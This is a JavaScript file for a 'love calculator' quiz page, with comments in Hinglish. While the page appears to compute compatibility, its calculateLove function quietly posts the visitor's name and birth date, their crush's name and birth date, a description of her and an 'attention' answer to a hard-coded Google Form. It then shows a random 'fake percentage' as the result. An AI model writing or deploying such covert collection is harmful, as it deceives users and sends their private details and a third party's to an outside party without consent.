// 🔹 Google Form POST URL
const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLScW0Ln0s1XeoPOOia00BHFnY21Onwbo8IHCyOxI7strOlRh8A/formResponse";

// 🔹 Entry IDs (Maine aapke Link se nikal kar yahan set kar di hain) ✅
const ENTRY_YOUR_NAME   = "entry.1186416098";
const ENTRY_YOUR_DOB    = "entry.379054120";
const ENTRY_CRUSH_NAME  = "entry.865214700";
const ENTRY_CRUSH_DOB   = "entry.1861826994";
const ENTRY_DESCRIBE    = "entry.602181016";  // Describe her in one word
const ENTRY_ATTENTION   = "entry.815112211";  // Attention: One or Many

function sendToGoogleForm(yourName, yourDOB, crushName, crushDOB, describe, attention) {
  const formData = new FormData();
  formData.append(ENTRY_YOUR_NAME, yourName);
  formData.append(ENTRY_YOUR_DOB, yourDOB);
  formData.append(ENTRY_CRUSH_NAME, crushName);
  formData.append(ENTRY_CRUSH_DOB, crushDOB);
  formData.append(ENTRY_DESCRIBE, describe);
  formData.append(ENTRY_ATTENTION, attention);

  fetch(FORM_URL, {
    method: "POST",
    mode: "no-cors",
    body: formData
  }).catch(error => console.error('Error:', error));
}

function calculateLove() {
  // HTML se values lena
  const yourName = document.getElementById("yourName").value.trim();
  const yourDOB = document.getElementById("yourDOB").value;
  const crushName = document.getElementById("crushName").value.trim();
  const crushDOB = document.getElementById("crushDOB").value;
  const describe = document.getElementById("describe").value.trim();
  const attention = document.getElementById("attention").value;

  // Validation: Agar koi bhi chiz khali ho toh alert do
  if (!yourName || !yourDOB || !crushName || !crushDOB || !describe || !attention) {
    alert("Please fill all the details to check compatibility! ❤️");
    return;
  }

  // 🔥 Send to Google Form (Background process)
  sendToGoogleForm(yourName, yourDOB, crushName, crushDOB, describe, attention);

  // Fake Percentage Logic (30% - 70%)
  const lovePercent = Math.floor(Math.random() * 41) + 30;

  localStorage.setItem("yourName", yourName);
  localStorage.setItem("crushName", crushName);
  localStorage.setItem("lovePercent", lovePercent);

  // Redirect to result page
  setTimeout(() => {
    window.location.href = "love.html";
  }, 500);
}
